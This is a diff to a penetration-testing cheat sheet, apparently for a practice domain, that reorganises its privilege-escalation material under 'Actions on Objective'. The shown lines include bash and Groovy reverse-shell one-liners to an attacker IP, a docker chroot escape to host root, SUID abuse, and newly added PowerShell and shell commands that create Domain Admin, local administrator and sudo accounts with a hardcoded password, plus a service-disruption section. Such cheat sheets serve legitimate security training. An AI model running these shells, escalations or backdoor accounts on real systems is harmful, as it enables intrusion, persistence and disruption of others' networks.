@@ -450,8 +450,9 @@ bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1
 ["/bin/bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1"].execute()
 ```
 
-# Section 6. Privilege Escalation
-## Windows Privilege Escalation
+# Section 6. Actions on Objective
+## 1. Privilege Escalation
+### Windows Privilege Escalation
 - ACL Abuse Chain with BloodHound
 ```
 # Bloodhound is a tool used for mapping Active Directory networks, identifying potential attack paths and privilege escalation opportunities.
@@ -490,7 +491,7 @@ localhost:8080
 3. Look for paths to escalate privileges
 ```
 
-## Linux Privilege Escalation
+### Linux Privilege Escalation
 - Set SUID
 ```
 1. Find the files or executables with set SUID bit:
@@ -515,18 +516,35 @@ or
 
 docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
 ```
+## 2. Administrative Account Creation
+- Create a Domain Admin account on Windows
+```
+New-ADUser `
+-Name "John Doe" `
+-GivenName "John" `
+-Surname "Doe" `
+-SamAccountName "jdoe" `
+-UserPrincipalName "jdoe@practice.corp" `
+-Path "CN=Users,DC=practice,DC=corp" `
+-AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
+-Enabled $true `
+-PasswordNeverExpires $true `
+-ChangePasswordAtLogon $false
 
-# Section 7. Miscellaneous
-### Wordlists
+Add-ADGroupMember -Identity "Domain Admins" -Members "jdoe"
 ```
-/usr/share/wordlists/rockyou.txt                                  # Password Cracking Wordlist
-/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt    # Wordlist for discovering hidden directories/files
-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      # Wordlist for discovering hidden directories/files
+- Create a local Administrator on Windows
 ```
-### Peass
+New-LocalUser -Name "jdoe" -Password (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force)
+Add-LocalGroupMember -Group "Administrators" -Member "jdoe"
 ```
-/usr/share/peass
+- Create a local sudo user on Linux
 ```
+sudo adduser jdoe
+sudo usermod -aG sudo jdoe
+```
+
+## 3. Service Disruption
 ### Windows Services
 - Check service status
 ```
@@ -615,4 +633,18 @@ docker stop $(docker ps -q)
 # Stop and remove containers using docker-compose
 # (replace /path/to/docker-compose.yml with the actual file path)
 docker compose -f /path/to/docker-compose.yml down
+```
+
+---
+
+# Section 7. Miscellaneous
+### Wordlists
+```
+/usr/share/wordlists/rockyou.txt                                  # Password Cracking Wordlist
+/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt    # Wordlist for discovering hidden directories/files
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      # Wordlist for discovering hidden directories/files
+```
+### Peass
+```
+/usr/share/peass
 ```
